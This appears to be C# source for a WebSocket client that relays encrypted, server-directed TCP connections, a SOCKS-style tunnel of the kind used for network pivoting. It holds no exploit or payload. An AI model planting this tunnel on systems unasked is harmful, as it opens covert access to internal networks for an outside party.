using System;
using System.Collections.Concurrent;
using System.Net.WebSockets;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Text.Json;
using System.Net.Sockets;
using System.Net;

namespace MessengerClient
{
    internal class WebSocketMessengerClient : MessengerClient
    {
        private ClientWebSocket _ws = new ClientWebSocket();
        private ConcurrentQueue<ArraySegment<byte>> _messageQueue = new ConcurrentQueue<ArraySegment<byte>>();
        private CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();

        public WebSocketMessengerClient(byte[] key) : base(key)
        {

        }

        public override async Task Connect(string uri)
        {
            await _ws.ConnectAsync(new Uri(uri), CancellationToken.None);
            Console.WriteLine($"[+] Successfully connected to {uri}");
            var receivingTask = ReceiveMessages(_ws);
            var sendingTask = SendMessages(_ws, _cancellationTokenSource.Token);
            await Task.WhenAll(receivingTask, sendingTask);

            if (_ws.State == WebSocketState.Open)
            {
                await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
                Console.WriteLine("WebSocket connection closed.");
            }
        }

        private async Task ReceiveMessages(ClientWebSocket ws)
        {
            byte[] buffer = new byte[4096];
            while (ws.State == WebSocketState.Open)
            {
                using (var memoryStream = new MemoryStream())
                {
                    WebSocketReceiveResult result = null;
                    do
                    {
                        result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        await memoryStream.WriteAsync(buffer, 0, result.Count);
                    } while (!result.EndOfMessage);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Server requested closure", CancellationToken.None);
                        Console.WriteLine("WebSocket server requested closure.");
                        break;
                    }

                    byte[] completeMessage = memoryStream.ToArray();

                    _ = HandleMessage(ws, Crypto.Decrypt(Key, completeMessage));
                }
            }
        }

        private async Task HandleMessage(ClientWebSocket ws, string completeMessage)
        {
            Message msg = JsonSerializer.Deserialize<Message>(completeMessage);
            //Console.WriteLine(completeMessage);
            if (clients.TryGetValue(msg.identifier, out TcpClient client))
            {
                NetworkStream stream = client.GetStream();
                byte[] data = Base64ToBytes(msg.msg);
                await stream.WriteAsync(data, 0, data.Length);
            }
            else
            {
                await SocksConnect(ws, completeMessage);
            }
        }

        private async Task SocksConnect(ClientWebSocket ws, string socksConnectRequest)
        {
            TcpClient client = new TcpClient();
            var request = JsonSerializer.Deserialize<SocksConnectRequest>(socksConnectRequest);
            byte[] socksConnectResults = new byte[] { };
            try
            {
                await client.ConnectAsync(request.address, request.port);
                IPEndPoint localEndPoint = client.Client.LocalEndPoint as IPEndPoint;
                string bindAddr = localEndPoint.Address.ToString();
                int bindPort = localEndPoint.Port;
                socksConnectResults = SocksConnectResults(request.identifier, 0, bindAddr, bindPort);
                clients[request.identifier] = client;
                EnqueueMessage(GenerateDownstreamMessage(request.identifier, socksConnectResults));
                await Stream(ws, request.identifier, client);
            }
            catch (Exception ex)
            {
                socksConnectResults = SocksConnectResults(request.identifier, 1, null, 0);
                EnqueueMessage(GenerateDownstreamMessage(request.identifier, socksConnectResults));
            }
        }

        public async Task Stream(ClientWebSocket ws, string identifier, TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            while (true)
            {
                byte[] buffer = new byte[4096];
                int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                if (bytesRead == 0)
                {
                    break;
                }

                byte[] data = new byte[bytesRead];
                Array.Copy(buffer, data, bytesRead);
                EnqueueMessage(GenerateDownstreamMessage(identifier, data));
            }
            stream.Close();
        }

        public ArraySegment<byte> GenerateDownstreamMessage(string identifier, byte[] msg)
        {
            return new ArraySegment<byte>(StringToBytes(JsonSerializer.Serialize(new Message
            {
                identifier = identifier,
                msg = BytesToBase64(msg)
            })));
        }

        private void EnqueueMessage(ArraySegment<byte> message)
        {
            _messageQueue.Enqueue(message);
        }

        private async Task SendMessages(ClientWebSocket ws, CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                while (_messageQueue.TryDequeue(out var message))
                {
                    byte[] encryptedMessage = Crypto.Encrypt(Key, message);
                    await ws.SendAsync(new ArraySegment<byte>(encryptedMessage), WebSocketMessageType.Binary, true, token);
                }
                await Task.Delay(10); // Adjust delay as necessary
            }
        }
    }
}
